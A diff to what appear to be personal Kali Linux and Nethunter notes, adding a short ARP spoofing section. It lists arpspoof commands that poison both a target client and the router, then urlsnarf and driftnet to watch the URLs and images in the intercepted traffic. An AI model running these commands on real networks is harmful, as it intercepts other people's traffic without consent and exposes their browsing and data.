@@ -1,5 +1,23 @@
 # Kali and Nethunter
 
+## Kali
+
+### Spoofing
+
+- ARP spoofing
+
+
+            # poison the client
+            arpspoof -i {interface} -t {target} {router}
+            # poison the router
+            arpspoof -i {interface} -t {router} {target}
+            
+            # watch the urls flow through the router
+            urlsnarf -i {interface}
+
+            # watch the flowing images
+            driftnet -i {interface}
+
 ## Nethunter
 
 ### Installation
